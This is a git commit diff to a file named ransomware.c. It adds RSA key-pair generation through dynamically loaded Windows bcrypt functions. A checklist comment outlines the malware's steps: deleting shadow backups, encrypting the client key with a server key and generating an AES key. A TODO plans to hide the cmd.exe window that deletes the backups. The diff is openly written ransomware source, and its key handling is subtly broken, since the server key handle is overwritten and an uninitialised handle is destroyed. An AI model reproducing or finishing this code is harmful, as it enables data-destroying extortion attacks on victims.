261da68a1c94d973cb9ff8e0e860a33c8dd4f004
Jonathan Leung <jonathan.leung@truesec.se>
2020-02-06 12:34:53 +0100

    client RSA key generation

--- src/ransomware.c
+++ src/ransomware.c
@@ -50,7 +50,7 @@ main(int argc, char **argv)
 	 * [X] Read RSA pubkey
 	 * [X] Remove shadow backups
 	 * [X] dynamically load crypt32.dll | https://docs.microsoft.com/en-us/windows/win32/dlls/using-run-time-dynamic-linking
-	 * [] Generate Client RSA key pair
+	 * [X] Generate Client RSA key pair
 	 * [] Encrypt Client RSA privkey with Server RSA pubkey
 	 * [] Remove Client RSA privkey
 	 * [] Generate AES key
@@ -62,7 +62,8 @@ main(int argc, char **argv)
 	HANDLE f;
 	HINSTANCE hinst;
 	FARPROC func_addr;
-	BCRYPT_KEY_HANDLE hkey;
+	BCRYPT_KEY_HANDLE skey, ckey;
+	BCRYPT_ALG_HANDLE alghandle;
 
 	char *lib, *func;
 	unsigned int pubkey_size;
@@ -73,13 +74,25 @@ main(int argc, char **argv)
 	if (!(hinst = LoadLibrary("bcrypt.dll")))
 		die("Failed to load bcrypt.dll");
 
-	hkey = ftok(argv[0], &hinst);
+	skey = ftok(argv[0], &hinst);
 
-	ShellExecute(NULL, "open", "cmd.exe", RM_SHADOW_BACKUPS, NULL, SW_SHOW);
+	ShellExecute(NULL, "open", "cmd.exe", RM_SHADOW_BACKUPS, NULL, SW_SHOW); /* TODO: Change to SW_HIDE */
+
+	/* Gen RSA keypair */
+	/* BCryptOpenAlgorithmProvider */
+	if (adrof(hinst,"BCryptOpenAlgorithmProvider")(&alghandle, BCRYPT_RSA_ALGORITHM, 0, 0))
+			die("Failed call to BCryptOpenAlgorithmProvider");
+	/* BCryptGenerateKeyPair */
+	if (adrof(hinst, "BCryptGenerateKeyPair")(alghandle, &skey, 2048, 0))
+			die("Failed call to BCryptGenerateKeyPair");
+	/* BCryptFinalizeKeyPair */
+	if (adrof(hinst, "BCryptFinalizeKeyPair")(skey, 0))
+			die("Failed call to BCryptFinalizeKeyPair");
+
 
 	/* BCryptDestroyKey */
-	if (adrof(hinst, "BCryptDestroyKey")(hkey))
-		die("Failed to BCryptDestroyKey");
+	adrof(hinst, "BCryptDestroyKey")(skey);
+	adrof(hinst, "BCryptDestroyKey")(ckey);
 	return 0;
 }
 
